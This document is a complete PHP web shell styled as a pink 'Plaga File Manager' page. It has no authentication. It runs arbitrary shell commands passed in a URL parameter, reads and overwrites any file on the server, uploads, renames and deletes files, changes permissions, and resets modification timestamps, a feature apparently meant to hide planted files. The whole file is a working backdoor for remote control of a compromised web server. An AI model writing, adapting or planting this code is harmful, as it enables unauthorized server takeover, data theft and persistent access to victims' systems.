<?php
// 

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
$edit = isset($_GET['edit']) ? realpath($_GET['edit']) : null;

function runCommand($cmd) {
    $disabled = explode(',', ini_get('disable_functions'));
    if (!in_array('shell_exec', $disabled)) {
        return shell_exec($cmd);
    }
    return "Command execution is disabled.";
}

if ($edit && is_file($edit)) {
    echo file_get_contents($edit);
    exit;
}

$output = '';
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    $output = runCommand("cd " . escapeshellarg($path) . " && bash -c " . escapeshellarg($command));
}

if (isset($_POST['rename']) && isset($_POST['old']) && isset($_POST['new'])) {
    rename($_POST['old'], dirname($_POST['old']) . '/' . $_POST['new']);
    exit;
}
if (isset($_POST['chmod']) && isset($_POST['file']) && isset($_POST['perm'])) {
    chmod($_POST['file'], octdec($_POST['perm']));
    exit;
}
if (isset($_POST['modtime']) && isset($_POST['file']) && isset($_POST['time'])) {
    touch($_POST['file'], strtotime($_POST['time']));
    exit;
}
if (isset($_POST['save']) && isset($_POST['file'])) {
    file_put_contents($_POST['file'], $_POST['content']);
    header("Location: ?path=" . urlencode(dirname($_POST['file'])));
    exit;
}
if (isset($_POST['delete']) && isset($_POST['file'])) {
    $target = $_POST['file'];
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    exit;
}
if (isset($_POST['newfile']) && isset($_POST['newfilename'])) {
    $newFile = $path . '/' . basename($_POST['newfilename']);
    file_put_contents($newFile, '');
    header("Location: ?path=" . urlencode($path));
    exit;
}
if (isset($_FILES['uploadfile'])) {
    $targetPath = $path . '/' . basename($_FILES['uploadfile']['name']);
    move_uploaded_file($_FILES['uploadfile']['tmp_name'], $targetPath);
    header("Location: ?path=" . urlencode($path));
    exit;
}

$items = scandir($path);
$folders = $files = [];
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $full = "$path/$item";
    is_dir($full) ? $folders[$item] = $item : $files[$item] = $item;
}
ksort($folders);
ksort($files);

function perms($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Plaga File Manager</title>
  <style>
    body { font-family: Arial; background: #ffe6f0; color: #333; padding: 20px; }
    h1 { color: #d63384; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { padding: 8px; border: 1px solid #f5a3c7; }
    tr:hover { background-color: #fcd9e5; }
    .folder { font-weight: bold; }
    .breadcrumb a { text-decoration: none; color: #d63384; margin-right: 5px; }
    .breadcrumb a:hover { text-decoration: underline; }
    .modal, .overlay { display: none; position: fixed; z-index: 1000; }
    .modal { top: 10%; left: 20%; width: 60%; background: #fff0f5; padding: 20px; border: 2px solid #d63384; }
    .overlay { top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 192, 203, 0.4); z-index: 500; }
    .modal textarea { width: 100%; height: 400px; font-family: monospace; }
    td[contenteditable] { background: #fff8fb; cursor: text; }
    form.inline { display: inline; margin-right: 10px; }
  </style>
  <script>
    function editFile(path) {
      fetch('?edit=' + encodeURIComponent(path))
        .then(res => res.text())
        .then(text => {
          document.getElementById('editor-area').value = text;
          document.getElementById('editor-path').value = path;
          document.getElementById('editor-filename').textContent = path.split('/').pop();
          document.getElementById('editor-modal').style.display = 'block';
          document.getElementById('overlay').style.display = 'block';
        });
    }
    function closeModal() {
      document.getElementById('editor-modal').style.display = 'none';
      document.getElementById('overlay').style.display = 'none';
    }
    function makeEditable(cell, type, path) {
      const span = cell.querySelector('span');
      span.contentEditable = true;
      span.focus();
      span.addEventListener('blur', () => {
        const value = span.textContent.trim();
        const formData = new FormData();
        if (type === 'name') {
          formData.append('rename', 1);
          formData.append('old', path);
          formData.append('new', value);
        } else if (type === 'chmod') {
          formData.append('chmod', 1);
          formData.append('file', path);
          formData.append('perm', value);
        } else if (type === 'mod') {
          formData.append('modtime', 1);
          formData.append('file', path);
          formData.append('time', value);
        }
        fetch('', { method: 'POST', body: formData }).then(() => location.reload());
      }, { once: true });
    }
    function deleteFile(path) {
      if (confirm("Yakin mau hapus?")) {
        const formData = new FormData();
        formData.append('delete', 1);
        formData.append('file', path);
        fetch('', { method: 'POST', body: formData }).then(() => location.reload());
      }
    }
  </script>
</head>
<body>
  <h1>Plaga</h1>

  <form method="get">
    <input name="cmd" placeholder="Enter shell command" style="width:300px">
    <input type="submit" value="Run">
  </form>
  <pre><?= htmlspecialchars($output) ?></pre>

  <form method="post" class="inline">
    <input name="newfilename" placeholder="New file name">
    <button type="submit" name="newfile">+ File</button>
  </form>
  <form method="post" enctype="multipart/form-data" class="inline">
    <input type="file" name="uploadfile">
    <button type="submit">⬆ Upload</button>
  </form>

  <div class="breadcrumb">
  <?php
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $full = '';
    foreach ($parts as $part) {
      if ($part === '') continue;
      $full .= DIRECTORY_SEPARATOR . $part;
      $real = realpath($full);
      if ($real) {
        echo "<a href='?path=" . urlencode($real) . "'>$part</a> / ";
      }
    }
  ?>
</div>

<table>
    <tr><th>Name</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Action</th></tr>
    <?php foreach ($folders as $item): $real = "$path/$item"; ?>
    <tr>
      <td class="folder" ondblclick="makeEditable(this, 'name', '<?= htmlspecialchars($real) ?>')"><a href='?path=<?= htmlspecialchars($real) ?>'>📁 <span><?= htmlspecialchars($item) ?></span></a></td>
      <td>-</td>
      <td ondblclick="makeEditable(this, 'mod', '<?= htmlspecialchars($real) ?>')"><span><?= date("d-m-Y H:i:s", filemtime($real)) ?></span></td>
      <td ondblclick="makeEditable(this, 'chmod', '<?= htmlspecialchars($real) ?>')"><span><?= perms($real) ?></span></td>
      <td>
        <button onclick="deleteFile('<?= htmlspecialchars($real) ?>')">🗑️ Delete</button>
      </td>
    </tr>
    <?php endforeach; ?>
    <?php foreach ($files as $item): $real = "$path/$item"; ?>
    <tr>
      <td ondblclick="makeEditable(this, 'name', '<?= htmlspecialchars($real) ?>')">📄 <span><?= htmlspecialchars($item) ?></span></td>
      <td><?= round(filesize($real)/1024, 2).' KB' ?></td>
      <td ondblclick="makeEditable(this, 'mod', '<?= htmlspecialchars($real) ?>')"><span><?= date("d-m-Y H:i:s", filemtime($real)) ?></span></td>
      <td ondblclick="makeEditable(this, 'chmod', '<?= htmlspecialchars($real) ?>')"><span><?= perms($real) ?></span></td>
      <td>
        <button onclick="editFile('<?= htmlspecialchars($real) ?>')">✏️ Edit</button>
        <button onclick="deleteFile('<?= htmlspecialchars($real) ?>')">🗑️ Delete</button>
      </td>
    </tr>
    <?php endforeach; ?>
  </table>

  <div class="overlay" id="overlay" onclick="closeModal()"></div>
  <div class="modal" id="editor-modal">
    <h2>Edit File: <span id="editor-filename" style="font-weight:normal;"></span></h2>
    <form method="post">
      <textarea name="content" id="editor-area"></textarea>
      <input type="hidden" name="file" id="editor-path">
      <br><br>
      <button type="submit" name="save">💾 Save</button>
      <button type="button" onclick="closeModal()">❌ Cancel</button>
    </form>
  </div>
</body>
</html>
